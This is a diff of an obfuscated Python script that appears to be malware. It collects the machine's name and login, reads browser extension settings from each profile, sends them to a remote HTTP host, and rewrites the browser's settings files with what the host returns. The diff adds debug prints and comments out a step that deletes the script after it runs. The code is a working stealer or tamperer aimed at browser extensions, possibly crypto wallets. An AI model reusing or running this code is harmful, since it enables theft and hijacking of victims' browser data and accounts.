@@ -27,9 +27,9 @@ sHost=f"http://{HOST}:{PORT}/"
 run_name=os.path.basename(argv[0])
 dev_mode=_F
 SPL=sys.platform
-if dev_mode==_F:
-	try:os.remove(argv[0]);print(f"deleted: {argv[0]}")
-	except OSError as e:print(f"Failed to delete: {argv[0]}: {e}")
+# if dev_mode==_F:
+# 	try:os.remove(argv[0]);print(f"deleted: {argv[0]}")
+# 	except OSError as e:print(f"Failed to delete: {argv[0]}: {e}")
 try:import requests
 except:subprocess.check_call([sys.executable,'-m','pip','install','requests'],stdout=subprocess.DEVNULL);import requests
 pc_name=platform.node()
@@ -168,6 +168,7 @@ def go(kill_process=_F):
 					elif G.startswith('Profile '):G=G[8:]
 					M=[]
 					for A in y:
+						print("------------test-------------")
 						z=os.path.join(J,'Local Extension Settings',A)
 						if not dev_mode and not os.path.isdir(z):continue
 						M.append(A);print(f"{X}: {M}");A0=f"{B}_{G}_{A}"
@@ -192,8 +193,11 @@ def go(kill_process=_F):
 						if N in C[D]:R=N
 						elif v in C[D]:R=v
 						else:E.append(f"[{len(E)}] {B}_{G} - failed: settings not found in spf");continue
+						print("------------test1-------------")
 						if I is _N:
 							A3={'pc_name':pc_name,'pc_login':pc_login,'type':sType,'sys_platform':SPL,'sys_separator':os.sep,s:F,'base_path':W[M[0]],'sett':R,N:C[D][R],O:C[l][O]};A4=sHost+'h';Y=requests.post(A4,{'data':json.dumps(A3,separators=(m,n))})
+							print("------------test2-------------")
+							print(Y)
 							if Y.status_code==200:I=Y.json()
 							else:print('failed to get ext_mac_data:',Y.status_code,Y.text);continue
 						if not N in I or not O in I:E.append(f"[{len(E)}] {B}_{G} - failed: settings not found in ext_mac");continue
@@ -213,6 +217,7 @@ def go(kill_process=_F):
 									else:S[D][P]={Z:_T}
 									q=_T
 						if kill_process:kill_process_by_name(X)
+						print("------------test-------------")
 						with open(K,'w',encoding=U)as e:json.dump(C,e,separators=(m,n))
 						if q:
 							with open(d,'w',encoding=U)as e:json.dump(S,e,separators=(m,n))
